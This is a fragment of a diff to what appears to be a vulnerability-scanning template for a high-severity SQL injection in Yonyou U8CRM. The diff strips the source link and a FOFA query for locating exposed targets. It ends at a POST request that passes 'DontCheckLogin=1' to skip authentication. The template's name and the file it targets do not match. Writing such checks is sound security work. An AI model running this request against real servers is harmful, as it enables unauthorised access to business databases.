@@ -3,12 +3,8 @@ info:
   name: 用友U8CRM getufvouchdata.php SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/hwm0linga4xq0eob'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: hwm0linga4xq0eob
-    fofa: title="用友U8CRM"
 http:
 - raw:
   - 'POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getWarehouseOtherInfo HTTP/1.1
